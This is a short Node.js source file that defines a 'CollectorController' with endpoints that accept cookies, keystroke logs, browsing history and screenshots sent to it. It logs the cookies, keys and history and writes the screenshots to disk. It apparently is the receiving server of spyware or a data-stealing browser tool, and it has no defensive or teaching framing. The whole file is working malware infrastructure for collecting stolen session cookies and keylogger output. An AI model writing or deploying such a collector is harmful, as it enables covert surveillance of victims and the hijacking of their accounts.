import fs from "node:fs";

class CollectorController {
    async saveCookies(req, res, _next) {
        const cookies = req.body;
        console.log('cookies', cookies);
        res.status(200).send('Cookies received');
    }

    async saveKeys(req, res, _next) {
        console.log(req.body); // Logs the request body to the console
        return res.status(200).send('Key logs received')
    }

    async saveHistory(req, res, _next) {
        const history = req.body;
        console.log('history', history);
        res.status(200).send('History received');
    }

    async saveScreenshot(req, res, _next) {
        // TODO: upload screenshots to S3 instead of local
        let buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');
        fs.writeFileSync('tmp/screenshot.jpeg', buff);
        return res.status(200).send('Screenshot received')
    }

    async listScreenshots(req, res, _next) {
        // TODO: list all screenshots from S3
        const screenshots = fs.readdirSync('tmp').filter((file) => file.endsWith('.jpeg'))
        res.json(screenshots)
    }
}

export default new CollectorController()
